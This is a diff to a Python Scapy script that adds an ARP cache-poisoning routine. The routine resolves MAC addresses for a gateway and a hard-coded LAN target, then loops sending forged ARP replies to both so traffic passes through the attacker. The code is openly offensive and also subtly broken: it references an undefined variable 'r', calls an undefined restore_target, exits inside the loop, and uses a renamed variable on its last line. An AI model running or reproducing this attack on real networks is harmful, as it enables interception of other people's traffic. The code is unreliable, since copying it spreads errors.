@@ -17,7 +17,7 @@ def getDefaultGateway():
             return gatewayIP
 
 
-defaultGatewayIP = getDefaultGateway()
+gateway_ip = getDefaultGateway()
 interface = "en0"
 target_ip = "192.168.0.19"
 broadcast_mac = "ff:ff:ff:ff:ff:ff"
@@ -27,8 +27,45 @@ def getMac(IP):
     ans, unans = srp(Ether(dst=broadcast_mac)/ARP(pdst = IP), timeout =2,
 iface=interface, inter=0.1)
     for send,recieve in ans:
-        return recieve.sprintf(r"%Ether.src%")
+        return r[Ether].src
     return None
+
+try:
+    gateway_mac = getMac(gateway_ip)
+    print ("Gateway MAC :" + gateway_mac)
+except:
+    print ("Failed to get gateway MAC. Exiting.")
+    sys.exit(0)
+try:
+    target_mac = getMac(target_ip)
+    print ("Target MAC :" + target_mac)
+except:
+    print ("Failed to get target MAC. Exiting.")
+    sys.exit(0)
+
+def poison(gateway_ip,gateway_mac,target_ip,target_mac):
+    targetPacket = ARP()
+    targetPacket.op = 2
+    targetPacket.psrc = gateway_ip
+    targetPacket.pdst = target_ip
+    targetPacket.hwdst= target_mac
+    gatewayPacket = ARP()
+    gatewayPacket.op = 2
+    gatewayPacket.psrc = target_ip
+    gatewayPacket.pdst = gateway_ip
+    gatewayPacket.hwdst= gateway_mac
+    while True:
+        try:
+            targetPacket.show()
+            send(targetPacket)
+            gatewayPacket.show()
+            send(gatewayPacket)
+            time.sleep(2)
+        except KeyboardInterrupt:
+            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+            sys.exit(0)
+        sys.exit(0)
+        return
 
 
 gateway_mac = getMac(defaultGatewayIP)
